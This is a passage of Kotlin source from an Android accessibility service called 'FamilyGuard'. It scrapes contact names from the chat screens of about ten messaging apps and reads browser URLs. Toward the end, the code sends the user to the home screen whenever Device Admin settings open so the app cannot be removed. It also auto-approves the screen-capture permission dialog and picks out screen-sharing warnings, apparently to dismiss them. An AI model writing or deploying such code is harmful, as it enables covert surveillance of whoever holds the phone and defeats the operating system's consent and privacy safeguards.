                val actionBarContact = findWhatsAppActionBarContact(rootNode)
                if (actionBarContact != null) {
                    Log.d(TAG, "📱 WhatsApp contact from action bar fallback: $actionBarContact")
                    return actionBarContact
                }
            }
            
            "com.instagram.android" -> {
                // Instagram DM has specific view IDs for thread title
                val instagramIds = listOf(
                    "com.instagram.android:id/header_title",  // DM chat header - CORRECT
                    "com.instagram.android:id/thread_title",
                    "com.instagram.android:id/row_inbox_username"  // Inbox list view
                )
                for (viewId in instagramIds) {
                    var result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        // Strip "Message " prefix from message request screens
                        if (result.startsWith("Message ")) {
                            result = result.removePrefix("Message ")
                        }
                        Log.d(TAG, "📷 Instagram contact from $viewId: $result")
                        return result
                    }
                }
                
                // Instagram fallback: Find toolbar and get first valid text
                val toolbarResult = findInstagramToolbarContact(rootNode)
                if (toolbarResult != null) {
                    Log.d(TAG, "📷 Instagram contact from toolbar: $toolbarResult")
                    return toolbarResult
                }
            }
            
            "org.telegram.messenger", "org.telegram.messenger.web" -> {
                // Telegram: Try view IDs first (older versions)
                val telegramIds = listOf(
                    "org.telegram.messenger:id/action_bar_title",
                    "org.telegram.messenger:id/chat_name",
                    "org.telegram.messenger:id/title_text_view",
                    "org.telegram.messenger:id/title",
                    "org.telegram.messenger:id/chat_title",
                    "org.telegram.messenger:id/header_text",
                    "org.telegram.messenger:id/name_text_view"
                )
                for (viewId in telegramIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "✈️ Telegram contact from ID: $result")
                        return result
                    }
                }
                
                // CRITICAL: Telegram often has NO resource IDs!
                // Look for content-desc with format "Name, Status" (e.g., "Affan R30 Hafiz, Muted\nlast seen")
                val contentDescResult = findTelegramContactFromContentDesc(rootNode)
                if (contentDescResult != null) {
                    Log.d(TAG, "✈️ Telegram contact from content-desc: $contentDescResult")
                    return contentDescResult
                }
                
                // Fallback: Find first valid TextView in toolbar area (tree traversal)
                val telegramToolbar = findTelegramToolbarContact(rootNode)
                if (telegramToolbar != null) {
                    Log.d(TAG, "✈️ Telegram contact from toolbar tree: $telegramToolbar")
                    return telegramToolbar
                }
                
                // Last resort: Search all TextViews for a valid contact name
                val treeResult = findFirstValidContactInTree(rootNode, 0)
                if (treeResult != null) {
                    Log.d(TAG, "✈️ Telegram contact from tree search: $treeResult")
                    return treeResult
                }
            }
            
            "com.facebook.orca", "com.facebook.mlite" -> {
                // Messenger: Multiple view IDs for different versions
                val messengerIds = listOf(
                    "com.facebook.orca:id/thread_title_name",
                    "com.facebook.orca:id/action_bar_title",
                    "com.facebook.orca:id/title_text",
                    "com.facebook.orca:id/title",
                    "com.facebook.orca:id/name_text_view",
                    "com.facebook.orca:id/thread_name",
                    "com.facebook.mlite:id/thread_title_name",
                    "com.facebook.mlite:id/action_bar_title"
                )
                for (viewId in messengerIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "💬 Messenger contact: $result")
                        return result
                    }
                }
                
                // Messenger fallback: Find in toolbar
                val messengerToolbar = findMessengerToolbarContact(rootNode)
                if (messengerToolbar != null) {
                    Log.d(TAG, "💬 Messenger contact from toolbar: $messengerToolbar")
                    return messengerToolbar
                }
            }
            
            "com.snapchat.android" -> {
                // Snapchat: FIRST try the clickable header TextView (most reliable)
                // The contact name is a clickable TextView at the top of the chat
                val headerContact = findSnapchatClickableHeader(rootNode)
                if (headerContact != null) {
                    Log.d(TAG, "👻 Snapchat contact from clickable header: $headerContact")
                    return headerContact
                }
                
                // Fallback 2: Tree traversal - find clickable TextViews in header area
                val treeContact = findSnapchatContactViaTree(rootNode)
                if (treeContact != null) {
                    Log.d(TAG, "👻 Snapchat contact from tree traversal: $treeContact")
                    return treeContact
                }
                
                // Fallback 3: Try known resource IDs (but NOT the obfuscated one - too many matches)
                val snapchatIds = listOf(
                    "com.snapchat.android:id/chat_title",
                    "com.snapchat.android:id/friend_name",
                    "com.snapchat.android:id/action_bar_title",
                    "com.snapchat.android:id/hova_header_title",
                    "com.snapchat.android:id/chat_header_title",
                    "com.snapchat.android:id/ab_title",
                    "com.snapchat.android:id/ngs_display_name",
                    "com.snapchat.android:id/name",
                    "com.snapchat.android:id/display_name",
                    "com.snapchat.android:id/title_text"
                )
                for (viewId in snapchatIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "👻 Snapchat contact from ID: $result")
                        return result
                    }
                }
                
                // DO NOT use content-desc for Snapchat - it contains chat messages, not contact names
            }
            
            // Discord DMs
            "com.discord" -> {
                val discordIds = listOf(
                    "com.discord:id/chat_header_title",
                    "com.discord:id/toolbar_title",
                    "com.discord:id/chat_title",
                    "com.discord:id/username_text"
                )
                for (viewId in discordIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "💜 Discord contact: $result")
                        return result
                    }
                }
            }
            
            // Twitter/X DMs
            "com.twitter.android" -> {
                val twitterIds = listOf(
                    "com.twitter.android:id/toolbar_title",
                    "com.twitter.android:id/name",
                    "com.twitter.android:id/screenname",
                    "com.twitter.android:id/conversation_header_name"
                )
                for (viewId in twitterIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "🐦 Twitter contact: $result")
                        return result
                    }
                }
            }
            
            // LINE
            "jp.naver.line.android" -> {
                val lineIds = listOf(
                    "jp.naver.line.android:id/chathistory_title",
                    "jp.naver.line.android:id/name_text",
                    "jp.naver.line.android:id/chat_header_title"
                )
                for (viewId in lineIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "💚 LINE contact: $result")
                        return result
                    }
                }
            }
            
            // Viber
            "com.viber.voip" -> {
                val viberIds = listOf(
                    "com.viber.voip:id/title",
                    "com.viber.voip:id/header_title",
                    "com.viber.voip:id/contact_name"
                )
                for (viewId in viberIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "💜 Viber contact: $result")
                        return result
                    }
                }
            }
            
            // TikTok DMs
            "com.zhiliaoapp.musically", "com.ss.android.ugc.trill" -> {
                val tiktokIds = listOf(
                    "com.zhiliaoapp.musically:id/title",
                    "com.zhiliaoapp.musically:id/chat_header_title",
                    "com.ss.android.ugc.trill:id/title"
                )
                for (viewId in tiktokIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "🎵 TikTok contact: $result")
                        return result
                    }
                }
            }
        }
        
        // SKIP generic fallback for Instagram - too many garbage elements in UI
        if (packageName == "com.instagram.android") {
            Log.d(TAG, "⚠️ Instagram: Could not find valid contact, using Unknown")
            return "Unknown"
        }
        
        // Generic fallback patterns (only for WhatsApp/Telegram/others)
        if (packageName == "com.whatsapp" || packageName == "org.telegram.messenger") {
            val genericPatterns = listOf(
                "action_bar_title",
                "toolbar_title", 
                "conversation_title"
            )
            
            for (pattern in genericPatterns) {
                val result = findValidContactInViewId(rootNode, pattern)
                if (result != null) {
                    return result
                }
            }
            
            // Last resort for known apps only
            return findToolbarTitleFiltered(rootNode)
        }
        
        // For other apps, return Unknown if specific IDs didn't work
        return "Unknown"
    }
    
    /**
     * Find a valid contact name in a specific view ID with noise filtering
     */
    private fun findValidContactInViewId(rootNode: AccessibilityNodeInfo, viewId: String): String? {
        try {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
            for (node in nodes) {
                val text = node.text?.toString()
                if (isValidContactName(text)) {
                    nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
                    return text
                }
            }
            nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
        } catch (e: Exception) {
            // Continue
        }
        return null
    }
    
    /**
     * Debug version: Find contact name with all candidates logged
     */
    private fun findValidContactInViewIdDebug(rootNode: AccessibilityNodeInfo, viewId: String): String? {
        try {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
            if (nodes.isEmpty()) {
                Log.d(TAG, "🔎 VIEW_DEBUG: $viewId - NO NODES FOUND")
            }
            for (node in nodes) {
                val text = node.text?.toString()
                Log.d(TAG, "🔎 VIEW_DEBUG: $viewId found text='$text' valid=${isValidContactName(text)}")
                if (isValidContactName(text)) {
                    nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
                    return text
                }
            }
            nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
        } catch (e: Exception) {
            Log.e(TAG, "🔎 VIEW_DEBUG: $viewId error: ${e.message}")
        }
        return null
    }
    
    /**
     * WhatsApp fallback: Find contact/group name from action bar area
     */
    private fun findWhatsAppActionBarContact(rootNode: AccessibilityNodeInfo): String? {
        try {
            // Find action bar container or toolbar
            val containerIds = listOf(
                "com.whatsapp:id/toolbar",
                "com.whatsapp:id/action_bar",
                "android:id/action_bar_container"
            )
            
            for (containerId in containerIds) {
                val containers = rootNode.findAccessibilityNodeInfosByViewId(containerId)
                for (container in containers) {
                    val contactName = findFirstValidTextInNode(container)
                    if (contactName != null) {
                        Log.d(TAG, "📱 WhatsApp action bar fallback found: '$contactName' in $containerId")
                        containers.forEach { try { it.recycle() } catch (e: Exception) {} }
                        return contactName
                    }
                }
                containers.forEach { try { it.recycle() } catch (e: Exception) {} }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in WhatsApp action bar fallback: ${e.message}")
        }
        return null
    }
    
    /**
     * Instagram-specific: Find contact name in toolbar area
     */
    private fun findInstagramToolbarContact(rootNode: AccessibilityNodeInfo): String? {
        try {
            val toolbarIds = listOf(
                "com.instagram.android:id/action_bar_container",
                "com.instagram.android:id/toolbar",
                "com.instagram.android:id/action_bar"
            )
            
            for (toolbarId in toolbarIds) {
                val toolbarNodes = rootNode.findAccessibilityNodeInfosByViewId(toolbarId)
                for (toolbar in toolbarNodes) {
                    val contactName = findFirstValidTextInNode(toolbar)
                    try { toolbar.recycle() } catch (e: Exception) {}
                    if (contactName != null) return contactName
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Instagram toolbar contact: ${e.message}")
        }
        return null
    }
    
    /**
     * Telegram-specific: Find contact name from content-desc
     * Telegram uses content-desc format "Name, Status\nlast seen recently" on profile element
     */
    private fun findTelegramContactFromContentDesc(rootNode: AccessibilityNodeInfo): String? {
        try {
            return findContentDescContact(rootNode, 0)
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Telegram content-desc: ${e.message}")
        }
        return null
    }
    
    /**
     * Recursively search for content-desc with contact name pattern
     */
    private fun findContentDescContact(node: AccessibilityNodeInfo, depth: Int): String? {
        if (depth > 6) return null
        
        try {
            val contentDesc = node.contentDescription?.toString()
            if (contentDesc != null && contentDesc.length > 3) {
                // Pattern: "Name, Status" or "Name\nlast seen"
                // Examples: "Affan R30 Hafiz, Muted\nlast seen recently"
                val commaIndex = contentDesc.indexOf(',')
                val newlineIndex = contentDesc.indexOf('\n')
                
                if (commaIndex > 2 || newlineIndex > 2) {
                    val splitIndex = if (commaIndex > 0 && (newlineIndex < 0 || commaIndex < newlineIndex)) commaIndex else newlineIndex
                    if (splitIndex > 2) {
                        val potentialName = contentDesc.substring(0, splitIndex).trim()
                        // Must not be "Go back", "Search", "All Chats", etc.
                        if (isValidContactName(potentialName) && 
                            !potentialName.equals("Go back", ignoreCase = true) &&
                            !potentialName.equals("Profile photo", ignoreCase = true)) {
                            return potentialName
                        }
                    }
                }
            }
            
            // Check children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                try {
                    val result = findContentDescContact(child, depth + 1)
                    if (result != null) return result
                } finally {
                    try { child.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {}
        
        return null
    }
    
    /**
     * Telegram-specific: Find contact name in toolbar/header area via tree traversal
     */
    private fun findTelegramToolbarContact(rootNode: AccessibilityNodeInfo): String? {
        try {
            // Try resource IDs first
            val toolbarIds = listOf(
                "org.telegram.messenger:id/action_bar_container",
                "org.telegram.messenger:id/toolbar",
                "org.telegram.messenger:id/header_layout"
            )
            
            for (toolbarId in toolbarIds) {
                val toolbarNodes = rootNode.findAccessibilityNodeInfosByViewId(toolbarId)
                for (toolbar in toolbarNodes) {
                    val contactName = findFirstValidTextInNode(toolbar)
                    try { toolbar.recycle() } catch (e: Exception) {}
                    if (contactName != null) return contactName
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Telegram toolbar contact: ${e.message}")
        }
        return null
    }
    
    /**
     * Search entire tree for first valid contact name (TextView)
     * Used as last resort for Telegram
     */
    private fun findFirstValidContactInTree(node: AccessibilityNodeInfo, depth: Int): String? {
        if (depth > 8) return null
        
        try {
            // Check if this is a TextView with valid contact name
            if (node.className?.toString() == "android.widget.TextView") {
                val text = node.text?.toString()
                if (isValidContactName(text)) {
                    return text
                }
            }
            
            // Check children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                try {
                    val result = findFirstValidContactInTree(child, depth + 1)
                    if (result != null) return result
                } finally {
                    try { child.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {}
        
        return null
    }
    
    /**
     * Messenger-specific: Find contact name in toolbar/header area
     */
    private fun findMessengerToolbarContact(rootNode: AccessibilityNodeInfo): String? {
        try {
            val toolbarIds = listOf(
                "com.facebook.orca:id/action_bar_container",
                "com.facebook.orca:id/thread_header",
                "com.facebook.orca:id/toolbar"
            )
            
            for (toolbarId in toolbarIds) {
                val toolbarNodes = rootNode.findAccessibilityNodeInfosByViewId(toolbarId)
                for (toolbar in toolbarNodes) {
                    val contactName = findFirstValidTextInNode(toolbar)
                    try { toolbar.recycle() } catch (e: Exception) {}
                    if (contactName != null) return contactName
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Messenger toolbar contact: ${e.message}")
        }
        return null
    }
    
    /**
     * Snapchat-specific: Find the clickable TextView header with contact name
     * In Snapchat chat, the contact name is a clickable TextView with obfuscated ID
     * at the top of the screen (bounds y < 400)
     */
    private fun findSnapchatClickableHeader(rootNode: AccessibilityNodeInfo): String? {
        try {
            val obfuscatedNodes = rootNode.findAccessibilityNodeInfosByViewId(
                "com.snapchat.android:id/0_resource_name_obfuscated"
            )
            
            Log.d(TAG, "👻 SNAPCHAT DEBUG: Found ${obfuscatedNodes.size} obfuscated nodes")
            
            for ((index, node) in obfuscatedNodes.withIndex()) {
                try {
                    val className = node.className?.toString() ?: "null"
                    val isClickable = node.isClickable
                    val text = node.text?.toString() ?: ""
                    val bounds = android.graphics.Rect()
                    node.getBoundsInScreen(bounds)
                    
                    Log.d(TAG, "👻 SNAPCHAT NODE[$index]: class=$className, clickable=$isClickable, text='$text', bounds.top=${bounds.top}")
                    
                    // Only consider clickable TextViews (this is the contact name header)
                    if (className == "android.widget.TextView" && isClickable) {
                        // Only consider elements in the top 400 pixels (header area)
                        if (bounds.top < 400) {
                            if (isValidContactName(text)) {
                                Log.d(TAG, "👻 SNAPCHAT MATCH: $text (bounds: ${bounds.top})")
                                return text
                            } else {
                                Log.d(TAG, "👻 SNAPCHAT REJECTED by isValidContactName: '$text'")
                            }
                        } else {
                            Log.d(TAG, "👻 SNAPCHAT REJECTED: bounds.top ${bounds.top} >= 400")
                        }
                    }
                } finally {
                    try { node.recycle() } catch (e: Exception) {}
                }
            }
            Log.d(TAG, "👻 SNAPCHAT: No valid contact found in header")
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Snapchat clickable header: ${e.message}")
        }
        return null
    }
    
    /**
     * Snapchat: Traverse the node tree to find a clickable TextView in the header area
     * This is a fallback when findAccessibilityNodeInfosByViewId returns empty results
     */
    private fun findSnapchatContactViaTree(rootNode: AccessibilityNodeInfo, depth: Int = 0): String? {
        if (depth > 15) return null // Limit depth to prevent infinite recursion
        
        try {
            val className = rootNode.className?.toString() ?: ""
            val text = rootNode.text?.toString() ?: ""
            val isClickable = rootNode.isClickable
            val bounds = android.graphics.Rect()
            rootNode.getBoundsInScreen(bounds)
            
            // Check if this is a clickable TextView in header area with valid contact name
            if (className == "android.widget.TextView" && 
                isClickable && 
                bounds.top < 400 && 
                text.isNotBlank() &&
                isValidContactName(text)) {
                Log.d(TAG, "👻 TREE FOUND: '$text' (clickable=$isClickable, bounds.top=${bounds.top})")
                return text
            }
            
            // Recurse into children
            for (i in 0 until rootNode.childCount) {
                val child = rootNode.getChild(i) ?: continue
                try {
                    val result = findSnapchatContactViaTree(child, depth + 1)
                    if (result != null) {
                        return result
                    }
                } finally {
                    try { child.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {
            // Continue
        }
        return null
    }
    
    /**
     * Snapchat-specific: Find contact name in header area
     * Look for clickable TextView with obfuscated ID in the top portion of screen
     */
    private fun findSnapchatHeaderContact(rootNode: AccessibilityNodeInfo): String? {
        try {
            // First try known header container IDs
            val headerIds = listOf(
                "com.snapchat.android:id/chat_header_container",
                "com.snapchat.android:id/action_bar_container",
                "com.snapchat.android:id/header_layout",
                "com.snapchat.android:id/hova_header_container"
            )
            
            for (headerId in headerIds) {
                val headerNodes = rootNode.findAccessibilityNodeInfosByViewId(headerId)
                for (header in headerNodes) {
                    val contactName = findFirstValidTextInNode(header)
                    try { header.recycle() } catch (e: Exception) {}
                    if (contactName != null) return contactName
                }
            }
            
            // Fallback: Look for clickable TextViews with obfuscated ID in header area
            // The contact name in chat view has: clickable=true, class=TextView, text=Name
            val obfuscatedNodes = rootNode.findAccessibilityNodeInfosByViewId(
                "com.snapchat.android:id/0_resource_name_obfuscated"
            )
            for (node in obfuscatedNodes) {
                try {
                    // Only consider clickable TextViews (this is the contact name header)
                    if (node.className?.toString() == "android.widget.TextView" && 
                        node.isClickable) {
                        val text = node.text?.toString()
                        if (isValidContactName(text)) {
                            Log.d(TAG, "👻 Snapchat contact from obfuscated clickable TextView: $text")
                            return text
                        }
                    }
                } finally {
                    try { node.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Snapchat header contact: ${e.message}")
        }
        return null
    }
    
    /**
     * Snapchat-specific: Find contact name from content-desc
     * Searches for content-desc patterns that look like contact names
     */
    private fun findSnapchatContactFromContentDesc(rootNode: AccessibilityNodeInfo): String? {
        try {
            return findSnapchatContentDesc(rootNode, 0)
        } catch (e: Exception) {
            Log.e(TAG, "Error finding Snapchat content-desc: ${e.message}")
        }
        return null
    }
    
    /**
     * Recursively search Snapchat tree for content-desc with contact name
     */
    private fun findSnapchatContentDesc(node: AccessibilityNodeInfo, depth: Int): String? {
        if (depth > 6) return null
        
        try {
            val contentDesc = node.contentDescription?.toString()
            if (contentDesc != null && contentDesc.length in 2..40) {
                // Snapchat uses various content-desc patterns
                // Look for patterns that could be names (no commas, dots, or special chars)
                val lowerDesc = contentDesc.lowercase()
                
                // Skip common UI elements (including Snapchat-specific)
                val skipPatterns = listOf(
                    "send", "camera", "chat", "back", "close", "menu", "search",
                    "snap", "story", "discover", "friends", "add", "profile",
                    "settings", "notifications", "button", "icon", "image",
                    "double tap", "swipe", "pull", "scroll", "refresh",
                    "memories", "stickers", "audio call", "video call", "call",
                    "spotlight", "map", "stories", "new snap", "received"
                )
                
                val isUIElement = skipPatterns.any { lowerDesc.contains(it) }
                
                if (!isUIElement && isValidContactName(contentDesc)) {
                    return contentDesc
                }
            }
            
            // Check children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                try {
                    val result = findSnapchatContentDesc(child, depth + 1)
                    if (result != null) return result
                } finally {
                    try { child.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {}
        
        return null
    }

    /**
     * Find first valid text in a node (with noise filtering)
     */
    private fun findFirstValidTextInNode(node: AccessibilityNodeInfo, depth: Int = 0): String? {
        if (depth > 4) return null
        
        try {
            if (node.className == "android.widget.TextView") {
                val text = node.text?.toString()
                if (isValidContactName(text)) {
                    return text
                }
            }
            
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                try {
                    findFirstValidTextInNode(child, depth + 1)?.let { return it }
                } finally {
                    try { child.recycle() } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {}
        
        return null
    }
    
    /**
     * Check if text is a valid contact name (not noise)
     */
    private fun isValidContactName(text: String?): Boolean {
        if (text.isNullOrBlank()) return false
        if (text.length > 50) return false
        if (text.length < 2) return false
        
        val lowerText = text.lowercase().trim()
        
        // REJECT: IP address patterns (must have 3+ octets like 192.168.1 or 10.0.0)
        // NOT rejecting simple version numbers like "4.0" in "DoubleSlash 4.0"
        if (lowerText.matches(Regex(".*\\d+\\.\\d+\\.\\d+.*"))) return false
        
        // REJECT: Text that looks like ONLY an IP/version (starts with digits and has dots)
        if (lowerText.matches(Regex("^\\d+\\.\\d+(\\.\\d+)*$"))) return false
        
        // REJECT: Text with multiple dots (looks like domain/IP) - but allow single dot
        if (lowerText.count { it == '.' } >= 3) return false
        
        // REJECT: Text starting with numbers
        if (lowerText.first().isDigit()) return false
        
        // REJECT: Text that looks like technical junk
        val technicalPatterns = listOf(
            "bright", "charm", "192.168", "10.0", "localhost", "config",
            "null", "undefined", "error", "exception", "debug"
        )
        for (pattern in technicalPatterns) {
            if (lowerText.contains(pattern)) return false
        }
        
        // EXACT MATCH exclusions (case-insensitive)
        val exactExclusions = listOf(
            "your story", "notifications", "search", "home", "explore",
            "reels", "messages", "inbox", "direct", "settings",
            "online", "offline", "typing", "recording", "active now",
            "unknown", "new message", "messages", "chats", "calls",
            "status", "communities", "updates", "channels",
            "instagram", "whatsapp", "telegram", "messenger", "snapchat",
            // Telegram UI elements - CRITICAL additions
            "emoji", "stickers", "gifs", "attach media", "send", "call",
            "go back", "profile photo", "more options", "open navigation menu",
            "all chats", "private co", "new message", "capture story",
            "web tabs", "add your birthday",
            // Snapchat UI elements - CRITICAL additions
            "chat", "camera", "memories", "spotlight", "map", "stories",
            "discover", "my friends", "subscriptions", "for you",
            "start an audio call", "start a video call", "extra options",
            "back", "navigate up"
        )
        if (exactExclusions.contains(lowerText)) return false
        
        // CONTAINS exclusions (any text containing these) - REMOVED game names as they block valid group names
        val containsExclusions = listOf(
            "last seen", "active", "typing",
            "yesterday", "today", "ago", "minute", "hour", "just now",
            "members", "participants", "subscriber", "admin",
            "delivered", "sent", "read", "unread",
            "voice message", "sticker", "gif",
            "@", "#", "write a message", "type a message", "add a comment",
            "reply", "following", "follower"
        )
        for (pattern in containsExclusions) {
            if (lowerText.contains(pattern)) return false
        }
        
        // STARTS WITH exclusions
        val startsWithExclusions = listOf(
            "online", "last seen", "active", "typing", "tap to"
        )
        for (pattern in startsWithExclusions) {
            if (lowerText.startsWith(pattern)) return false
        }
        
        return true
    }
    
    /**
     * Finds title text in toolbar area with filtering
     */
    private fun findToolbarTitleFiltered(rootNode: AccessibilityNodeInfo): String {
        // Look for common toolbar/action bar title patterns
        val titlePatterns = listOf(
            "android:id/toolbar",
            "androidx.appcompat:id/action_bar",
            "android:id/action_bar_title",
            "toolbar",
            "action_bar"
        )
        
        for (pattern in titlePatterns) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(pattern)
                for (node in nodes) {
                    // Search for text view children with filtering
                    val title = findFirstValidTextInNode(node)
                    if (title != null && title.isNotBlank()) {
                        nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
                        return title
                    }
                }
                nodes.forEach { try { it.recycle() } catch (e: Exception) {} }
            } catch (e: Exception) {
                // Continue
            }
        }
        
        return "Unknown"
    }
    
    /**
     * Extracts browser URL context
     */
    private fun extractBrowserContext(rootNode: AccessibilityNodeInfo): String {
        val urlPatterns = listOf(
            "com.android.chrome:id/url_bar",
            "com.android.chrome:id/omnibox_text",
            "org.mozilla.firefox:id/url_bar",
            "url_bar", "omnibox"
        )
        
        for (pattern in urlPatterns) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(pattern)
                for (node in nodes) {
                    val text = node.text?.toString()
                    if (!text.isNullOrBlank()) {
                        // Clean URL to just domain
                        val cleanUrl = text.replace("https://", "")
                            .replace("http://", "")
                            .replace("www.", "")
                            .split("/").firstOrNull() ?: text
                        nodes.forEach { it.recycle() }
                        return cleanUrl.take(40)
                    }
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                // Continue
            }
        }
        
        return "Browser"
    }
    
    /**
     * Extracts generic title from toolbar
     */
    private fun extractGenericTitle(rootNode: AccessibilityNodeInfo): String {
        return findToolbarTitle(rootNode)
    }
    
    /**
     * Finds title text in toolbar area
     */
    private fun findToolbarTitle(rootNode: AccessibilityNodeInfo): String {
        // Look for common toolbar/action bar title patterns
        val titlePatterns = listOf(
            "android:id/toolbar",
            "androidx.appcompat:id/action_bar",
            "android:id/action_bar_title",
            "toolbar",
            "action_bar"
        )
        
        for (pattern in titlePatterns) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(pattern)
                for (node in nodes) {
                    // Search for text view children
                    val title = findTextInNode(node)
                    if (title.isNotBlank() && title.length < 50) {
                        nodes.forEach { it.recycle() }
                        return title
                    }
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                // Continue
            }
        }
        
        return "Unknown"
    }
    
    /**
     * Recursively finds first meaningful text in a node
     */
    private fun findTextInNode(node: AccessibilityNodeInfo): String {
        // Check this node
        val text = node.text?.toString()
        if (!text.isNullOrBlank() && text.length < 50) {
            return text
        }
        
        // Check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val childText = findTextInNode(child)
            child.recycle()
            if (childText.isNotBlank()) {
                return childText
            }
        }
        
        return ""
    }
    
    /**
     * Gets the app name from package name
     */
    private fun getAppName(packageName: String): String {
        // Check messaging apps first
        MESSAGING_APPS[packageName]?.let { return it }
        
        // Browser check
        if (BROWSER_PACKAGES.contains(packageName)) {
            return "Browser"
        }
        
        // Get from package manager
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: PackageManager.NameNotFoundException) {
            packageName.split(".").lastOrNull()?.capitalize() ?: packageName
        }
    }
    
    /**
     * Check if the class name indicates Device Admin settings page
     */
    private fun isDeviceAdminSettingsPage(className: String): Boolean {
        if (className.isBlank()) return false
        val lowerClassName = className.lowercase()
        return DEVICE_ADMIN_ACTIVITY_PATTERNS.any { pattern ->
            lowerClassName.contains(pattern.lowercase())
        }
    }
    
    /**
     * Block access to Device Admin settings by redirecting to home screen
     * This prevents users from accidentally disabling Device Admin
     */
    private fun blockDeviceAdminAccess() {
        try {
            // Method 1: Press HOME button to exit settings
            performGlobalAction(GLOBAL_ACTION_HOME)
            
            // Method 2: Launch our app to ensure user is redirected
            handler.postDelayed({
                try {
                    val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                        addCategory(Intent.CATEGORY_HOME)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    applicationContext.startActivity(homeIntent)
                } catch (e: Exception) {
                    Log.e(TAG, "Error redirecting to home: ${e.message}")
                }
            }, 100)
            
            // Show toast to user
            handler.post {
                Toast.makeText(
                    applicationContext,
                    "Device Admin settings protected by FamilyGuard",
                    Toast.LENGTH_SHORT
                ).show()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error blocking device admin access: ${e.message}")
        }
    }
    
    private fun isSystemUIPackage(packageName: String): Boolean {
        return SYSTEM_UI_PACKAGES.any { it.equals(packageName, ignoreCase = true) }
    }

    /**
     * Detects and auto-approves MediaProjection permission dialog
     * This works similar to how AirDroid handles screen mirroring
     */
    private fun handleMediaProjectionDialog(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Check if this is a MediaProjection dialog by looking for keywords
            if (isMediaProjectionDialog(rootNode)) {
                Log.d(TAG, "MediaProjection dialog detected! Auto-approving...")
                
                // First, try to check "Don't show again" checkbox if present
                checkDontShowAgainCheckbox(rootNode)
                
                // Then click the approve button with a small delay
                handler.postDelayed({
                    try {
                        val freshRoot = rootInActiveWindow
                        if (freshRoot != null) {
                            clickApproveButton(freshRoot)
                            freshRoot.recycle()
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error clicking approve button: ${e.message}")
                    }
                }, 100)
            }
            
            rootNode.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling MediaProjection dialog: ${e.message}")
        }
    }
    
    /**
     * Handles ALL privacy/permission dialogs from any system app
     * Uses 4-layer approach: Resource ID -> Button text -> OEM-specific -> Smart pattern
     * Also handles expandable overlays (like "Protecting your privacy" notification)
     * 
     * IMPORTANT: Only triggers when screen streaming is ACTIVE (checked by caller)
     */
    private fun handlePrivacyDialog(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Get all text from the dialog
            val dialogText = getAllTextFromNode(rootNode).lowercase()
            
            // Keywords that indicate a screen sharing protection dialog (Vivo/other OEMs)
            val isScreenSharingProtectionDialog = listOf(
                // Vivo protection overlay
                "protecting", "protection", "protected",
                "screen is being shared", "screen being shared", "screen sharing",
                "being recorded", "being shared", "shared screen",
                // Continue sharing keywords
                "continue sharing", "continue streaming", "continue casting",
                "stop sharing", "stop streaming", "stop casting",
                // Screen capture keywords
                "will start capturing", "start capturing", "screen capture",
                "share your screen", "screen recording", "recording your screen",
                "wants to capture", "familyguard", "projection"
            ).any { dialogText.contains(it) }
            
            // Skip if not a screen sharing protection dialog
            if (!isScreenSharingProtectionDialog) {
                rootNode.recycle()
                return
            }
            
            Log.d(TAG, "🔓 Screen sharing protection dialog from $packageName!")
            Log.d(TAG, "Dialog text: ${dialogText.take(200)}...")
            
            // Check if "Continue sharing" button is already visible
            val hasContinueSharingButton = listOf(
                "continue sharing", "continue streaming", "continue casting",
                "keep sharing", "resume sharing"
